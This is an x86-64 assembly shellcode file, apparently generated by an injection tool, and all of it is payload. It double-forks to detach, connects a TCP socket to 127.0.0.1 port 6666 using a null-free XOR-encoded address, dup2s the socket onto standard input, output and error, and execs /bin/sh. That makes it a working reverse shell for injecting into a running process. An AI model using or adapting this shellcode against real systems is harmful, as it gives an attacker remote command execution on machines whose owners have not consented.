/*
# date: 20191216
# author: thinkycx
# description: fork fork and reverse shell to 127.0.0.1 6666, generated by inject.py
*/
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 0x39 */
    pop rax
    syscall
cmp rax, 1;
 jnl fork_fork_shellcode_end;
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 0x39 */
    pop rax
    syscall
    cmp rax, 1
    jl forkexit_4
    /* exit(status=0) */
    xor edi, edi /* 0 */
    /* call exit() */
    push SYS_exit /* 0x3c */
    pop rax
    syscall
forkexit_4:
    /* open new socket */
    /* open new socket */
    /* call socket(2, Constant('SOCK_STREAM', 0x1), 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push 2
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    /* push '\x02\x00\x1ea\x7f\x00\x00\x01' */
    mov rax, 0x201010101010101
    push rax
    mov rax, 0x201010101010101 ^ 0x100007f611e0002
    xor [rsp], rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 16) */
    push SYS_connect /* 0x2a */
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
    /* dup() file descriptor rbp into stdin/stdout/stderr */
dup_1:
    /* moving rbp into rbp, but this is a no-op */

    push 3
loop_2:
    pop rsi
    dec rsi
    js after_3
    push rsi

    /* call dup2('rbp', 'rsi') */
    push SYS_dup2 /* 0x21 */
    pop rax
    mov rdi, rbp
    syscall

    jmp loop_2
after_3:

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
fork_fork_shellcode_end:
 nop;
